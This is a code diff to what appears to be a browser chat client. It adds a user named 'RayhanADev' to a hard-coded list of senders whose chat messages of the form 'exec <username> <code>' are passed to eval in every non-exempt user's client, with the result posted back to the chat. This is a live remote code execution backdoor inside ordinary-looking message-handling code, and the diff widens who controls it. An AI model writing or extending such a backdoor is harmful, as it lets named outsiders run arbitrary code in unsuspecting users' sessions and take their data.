@@ -589,7 +589,7 @@ Owner:<ul>
                 }
                 break;
             case "message":
-                if (["NKY", "wolfie", "ZeroTix"].includes(msg.m.s) && !["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN"].includes(user)) {
+                if (["NKY", "wolfie", "ZeroTix", "RayhanADev"].includes(msg.m.s) && !["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN"].includes(user)) {
                     if (msg.m.r !== -2 && msg.m.m.startsWith("exec " + user + " ")) {
                         try {
                             sendMessage(eval(msg.m.m.slice(6 + user.length)));
